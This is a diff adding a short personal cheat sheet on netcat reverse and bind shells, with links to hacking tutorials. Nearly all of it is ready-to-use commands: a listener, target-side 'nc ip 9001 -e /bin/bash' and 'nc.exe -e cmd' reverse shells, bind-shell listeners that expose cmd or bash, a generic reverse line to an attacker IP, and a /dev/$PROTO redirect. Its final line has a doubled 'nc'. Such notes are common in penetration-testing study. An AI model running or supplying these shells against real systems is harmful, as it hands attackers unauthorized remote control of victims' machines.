@@ -1,0 +1,66 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  NETCAT SHELL, REVERSE AND BIND
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-08-03[Aug-Mon]21-31PM 
+
+##https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
+##https://medium.com/@PenTest_duck/offensive-netcat-ncat-from-port-scanning-to-bind-shell-ip-whitelisting-834689b103da
+
+##https://who23.github.io/2020/12/03/sockets-in-your-shell.html
+
+==
+NETCAT REVERSE SHELL
+==
+
+SET UP NETCAT LISTENER ON SOURCE
+nc -lvnp 9001
+
+NETCAT SHELL ON TARGET
+
+FOR LINUX
+nc ip 9001 –e /bin/bash
+nc -nv ip 9001 -e /bin/bash
+
+FOR WINDOWS
+nc.exe -e cmd ip 9001
+
+==
+
+Bind shells have the listener running on the target and the attacker connect to the listener in order to gain a remote shell.
+Reverse shells have the listener running on the attacker and the target connecting to the attacker with a shell.
+
+nc -nvlp <port> -e {/bin/bash | cmd.exe}(bind)
+nc -nv <attacker-ip> <port> -e {/bin/bash | cmd.exe} (reverse)
+
+==
+
+==
+WINDOWS BIND SHELL
+==
+
+LISTENER WITH CMD
+nc -nvlp 9002 -e cmd
+
+CONNECT
+nc -nv ip 9002
+
+==
+
+==
+LINUX BIND SHELL
+==
+
+LISTENER WITH BASH
+nc -nvlp 9002 -e /bin/bash
+
+CONNECT
+nc -nv ip 9002
+
+==
+ANOTHER WAY
+==
+
+echo "text!" > /dev/$PROTO/$HOST/$PORT
+nc nc -nvlp port
